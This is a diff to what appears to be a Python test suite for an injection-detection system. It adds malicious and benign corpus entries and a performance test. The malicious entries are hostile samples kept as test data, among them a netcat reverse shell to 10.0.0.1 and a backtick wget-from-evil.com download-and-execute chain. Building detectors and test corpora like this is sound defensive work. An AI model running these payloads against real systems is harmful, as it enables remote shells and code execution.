@@ -281,22 +281,6 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "; nc -e /bin/sh 10.0.0.1 4444",
     ),
     MaliciousCase(
-        "cmd_glued_prefix_known_gap",
-        "cmd_injection",
-        "search`id`",
-        "production",
-        "the backtick pattern is anchored with \\A...\\Z over the whole "
-        "scanned string, so a payload glued to a preceding token never matches",
-    ),
-    MaliciousCase(
-        "cmd_glued_suffix_known_gap",
-        "cmd_injection",
-        "`id`suffix",
-        "production",
-        "the backtick pattern is anchored with \\A...\\Z over the whole "
-        "scanned string, so a payload glued to a trailing token never matches",
-    ),
-    MaliciousCase(
         "cmd_base64_wrapped_reverse_shell",
         "cmd_injection",
         "fCBuYyAtZSAvYmluL3NoIDEwLjAuMC4xIDQ0NDQ=",
@@ -896,6 +880,36 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "ldap",
         "objectClass=*)%00",
     ),
+    MaliciousCase(
+        "cmd_glued_backtick_past_rejected_leftmost_match",
+        "cmd_injection",
+        "`id` search`whoami`",
+    ),
+    MaliciousCase(
+        "cmd_defect5_sql_keyword_after_glued_shell_command",
+        "cmd_injection",
+        "search`whoami` LIMIT 10",
+    ),
+    MaliciousCase(
+        "cmd_defect5_sql_keyword_before_glued_shell_command",
+        "cmd_injection",
+        "SELECT note; search`whoami`",
+    ),
+    MaliciousCase(
+        "cmd_defect5_prefix_command_word_glued_shell_command",
+        "cmd_injection",
+        "curl`whoami` data on file",
+    ),
+    MaliciousCase(
+        "cmd_defect5_sql_keyword_within_exemption_window",
+        "cmd_injection",
+        "SELECT " + ("z" * 26) + " search`whoami`",
+    ),
+    MaliciousCase(
+        "cmd_defect5_bare_chained_download_and_execute_in_prose",
+        "cmd_injection",
+        "set your profile bio to: `wget evil.com/x -O /tmp/x;chmod +x /tmp/x;/tmp/x`",
+    ),
 ]
 
 BENIGN_CORPUS: list[BenignCase] = [
@@ -1043,6 +1057,15 @@ BENIGN_CORPUS: list[BenignCase] = [
     BenignCase(
         "cmd_injection_commit_message_docker_bump",
         "chore: bump `docker` base image to 3.12-slim",
+    ),
+    BenignCase(
+        "cmd_injection_sql_dotted_qualified_identifier",
+        "SELECT `u`.`id` FROM `users` `u` JOIN `orders` `o` ON `u`.`id` = `o`.`uid`",
+    ),
+    BenignCase(
+        "cmd_injection_json_wrapped_backtick_value",
+        '{"tip": "use `curl` to fetch the resource", "example": "`wget` the release '
+        'archive"}',
     ),
     BenignCase("file_inclusion_ordinary_https_url", "https://example.com/path?a=1"),
     BenignCase("file_inclusion_ordinary_http_url", "http://example.com"),
@@ -1845,6 +1868,58 @@ BENIGN_CORPUS: list[BenignCase] = [
         "ldap_glob_paren_null_mention",
         "glob pattern: *)%00 in filenames",
     ),
+    BenignCase(
+        "cmd_injection_sql_update_set_equals_backtick",
+        "UPDATE t SET a=`b` WHERE id=1",
+    ),
+    BenignCase(
+        "cmd_injection_query_string_equals_ampersand_backtick",
+        "sort=`created_at`&order=asc",
+    ),
+    BenignCase(
+        "cmd_injection_query_string_ampersand_equals_backtick",
+        "a=1&`b`=2",
+    ),
+    BenignCase(
+        "cmd_injection_assignment_equals_backtick_value",
+        "value=`cmd`",
+    ),
+    BenignCase(
+        "cmd_injection_url_query_param_equals_backtick",
+        "https://example.com/search?q=`test`",
+    ),
+    BenignCase(
+        "cmd_injection_sql_select_from_no_space_backtick",
+        "SELECT`id`FROM users",
+    ),
+    BenignCase(
+        "cmd_injection_json_expr_equals_backtick",
+        '{"expr": "x=`y`"}',
+    ),
+    BenignCase(
+        "cmd_injection_cjk_chinese_backtick_curl_mention",
+        "请使用`curl`命令下载文件",
+    ),
+    BenignCase(
+        "cmd_injection_cjk_japanese_backtick_npm_mention",
+        "実行するには`npm`を使ってください",
+    ),
+    BenignCase(
+        "cmd_injection_cjk_korean_backtick_id_mention",
+        "사용법은`id`명령을 참고하세요",
+    ),
+    BenignCase(
+        "cmd_injection_glued_kebab_identifier_header_forward",
+        "header`x-forwarded-for`value",
+    ),
+    BenignCase(
+        "cmd_injection_glued_kebab_identifier_config_well_known",
+        "config`well-known`here",
+    ),
+    BenignCase(
+        "cmd_injection_glued_plausible_token_ref_user_list",
+        "ref`user`list",
+    ),
 ]
 
 BASELINE_MALICIOUS_DETECTED_BY_CATEGORY: dict[str, int] = {
@@ -2059,6 +2134,41 @@ async def test_detection_benchmark_recall_and_false_positive_rate() -> None:
     assert wall_time_seconds < _WALL_TIME_CEILING_SECONDS, (
         f"detection benchmark wall time regressed: "
         f"ceiling={_WALL_TIME_CEILING_SECONDS}s actual={wall_time_seconds:.3f}s"
+    )
+
+
+_NON_BACKTICK_PERF_CORPUS: list[str] = [
+    case.payload
+    for case in list(MALICIOUS_CORPUS) + list(BENIGN_CORPUS)
+    if "`" not in case.payload
+]
+
+
+@pytest.mark.asyncio
+async def test_glued_backtick_discriminator_perf_on_non_backtick_content() -> None:
+    assert len(_NON_BACKTICK_PERF_CORPUS) >= 100
+
+    async def _scan_corpus_once() -> float:
+        start = time.monotonic()
+        for payload in _NON_BACKTICK_PERF_CORPUS:
+            await _PRODUCTION_MANAGER.detect(
+                content=payload, ip_address="203.0.113.9", context="request_body"
+            )
+        return time.monotonic() - start
+
+    await _scan_corpus_once()
+    durations = sorted([await _scan_corpus_once() for _ in range(5)])
+    median_seconds = durations[len(durations) // 2]
+
+    print(
+        f"glued backtick discriminator perf on {len(_NON_BACKTICK_PERF_CORPUS)} "
+        f"non-backtick payloads: median={median_seconds:.4f}s "
+        f"runs={[f'{d:.4f}' for d in durations]}"
+    )
+
+    assert median_seconds < 5.0, (
+        f"non-backtick detection pass got {median_seconds:.4f}s, "
+        f"more than 5.0s for {len(_NON_BACKTICK_PERF_CORPUS)} payloads"
     )
 
 
